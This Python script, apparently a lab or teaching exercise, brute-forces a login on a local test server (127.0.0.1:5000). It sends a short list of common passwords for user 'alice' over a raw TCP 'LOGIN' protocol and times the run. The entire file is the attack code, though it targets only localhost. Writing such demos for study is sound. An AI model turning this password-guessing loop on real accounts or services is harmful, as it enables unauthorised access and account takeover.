import socket
import time

HOST = "127.0.0.1"
PORT = 5000
TARGET_USER = "alice"

password_list = [
    "123456",
    "password",
    "alice",
    "alice123",
    "letmein",
    "admin",
]


def attempt_login(username: str, password: str) -> str:
    with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s:
        s.connect((HOST,PORT))

        message = f"LOGIN {username} {password}\n"
        s.sendall(message.encode())

        response = s.recv(1024).decode().strip()
        return response
    

def brute_force():
    start_time = time.time()

    for password in password_list:
        response = attempt_login(TARGET_USER,password)

        print(f"Trying: {password} -> {response}")

        if response == "SUCCESS":
            print(f"\nPassword found: {password}")
            break

    end_time=time.time()
    print(f"\n Time taken: {end_time - start_time:.4f} seconds")


if __name__ == "__main__":
    brute_force()